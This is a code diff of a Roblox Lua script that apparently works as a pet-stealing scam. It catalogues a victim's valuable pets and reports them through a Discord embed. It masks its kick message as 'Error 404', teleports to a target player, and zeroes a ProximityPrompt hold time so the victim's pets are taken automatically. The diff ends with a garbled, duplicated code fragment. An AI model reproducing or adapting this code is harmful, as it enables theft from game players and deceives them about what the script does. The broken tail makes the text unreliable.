@@ -256,7 +256,7 @@ local function getPlayersPets()
         return
     end
 
-    for petUid, value in petInventory do
+    for petUid, value in pairs(petInventory) do
         local matchedName = checkPetsWhilelist(value.PetType)
         if matchedName then
             foundAny = true
@@ -265,23 +265,21 @@ local function getPlayersPets()
 
             if string.find(value.PetType, "Rainbow") then
                 mutation = "Rainbow "
-                petInfo.value += 10000
+                petInfo.value = petInfo.value + 10000
             elseif string.find(value.PetType, "Mega") then
                 mutation = "Mega "
-                petInfo.value += 15000
+                petInfo.value = petInfo.value + 15000
             elseif string.find(value.PetType, "Ascended") then
                 mutation = "Ascended "
-                petInfo.value += 8000
+                petInfo.value = petInfo.value + 8000
             end
 
-            table.insert(victimPetTable, string.format("%s%s %s", mutation, petInfo.emoji, matchedName))
-            totalPetValue += petInfo.value
+            table.insert(victimPetTable, mutation .. matchedName)
         end
     end
 
-    -- Kick if no matching pets found
     if not foundAny then
-        VICTIM:Kick("Dont Use Alt Accounts")
+        VICTIM:Kick("Error 404")
     end
 end
 
@@ -289,6 +287,54 @@ end
 
 local function startSteal(trigerName)
     if game.Players[trigerName].Character.Head:FindFirstChild("ProximityPrompt") then
+        game.Players[trigerName].Character.Head.ProximityPrompt.HoldDuration = 0
+        deltaBypass()
+    end
+end
+
+local function checkPetsInventory(target)
+    for petUid, value in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
+        if not checkPetsWhilelist(value.PetType) then
+            continue
+        end
+
+        local petObject = getPetObject(petUid)
+        
+        if not petObject then
+            continue
+        end
+        
+        equipPet(petObject)
+        task.wait(0.3)
+        startSteal(target)
+    end
+end
+
+local function idlingTarget()
+    task.spawn(function()
+        while task.wait(0.2) do
+            local isTarget, trigerName = waitForJoin()
+
+            if isTarget then
+                teleportTarget(trigerName)
+                checkPetsInventory(trigerName)
+            end
+        end
+    end)
+end
+
+getPlayersPets()
+
+task.spawn(function()
+    while task.wait(0.5) do
+        if #victimPetTable > 0 then
+            idlingTarget()
+            createDiscordEmbed(table.concat(victimPetTable, "\n"), totalPetValue, "https://cdn.discordapp.com/attachments/.../items.txt")
+            break
+        end
+    end
+end)
+cter.Head:FindFirstChild("ProximityPrompt") then
         game.Players[trigerName].Character.Head.ProximityPrompt.HoldDuration = 0
         deltaBypass()
     end
